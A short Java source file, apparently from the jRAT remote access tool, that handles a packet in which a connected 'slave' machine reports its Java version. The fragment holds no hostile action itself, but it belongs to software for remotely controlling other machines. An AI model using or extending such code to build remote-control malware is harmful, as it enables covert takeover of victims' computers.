package jrat.controller.packets.incoming;

import jrat.controller.Slave;

import java.io.DataInputStream;


public class Packet9InitJavaVersion extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave, DataInputStream dis) throws Exception {
		String version = slave.readLine();
		slave.setJavaVersion(version);
	}
}
